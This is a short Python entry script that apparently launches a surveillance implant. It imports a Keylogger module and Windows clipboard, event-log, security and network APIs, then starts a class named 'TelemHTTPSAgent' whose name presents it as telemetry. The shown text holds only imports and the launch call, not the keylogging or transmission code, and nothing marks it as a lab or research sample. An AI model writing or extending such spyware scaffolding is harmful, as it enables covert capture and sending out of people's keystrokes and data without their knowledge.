import os
import sys
import base64
import http.client
import getpass
import ssl
import socket
from datetime import datetime
import pytz
import random
import time 

import platform
if platform.system() == 'Windows':
	import win32clipboard
	import win32api
	import win32con
	import win32evtlog
	import win32security
	import win32evtlogutil
	import win32net
	import win32netcon

from keylogger import Keylogger
from telemHttpsAgentDef import TelemHTTPSAgent

	
agent = TelemHTTPSAgent()
agent.runTlm()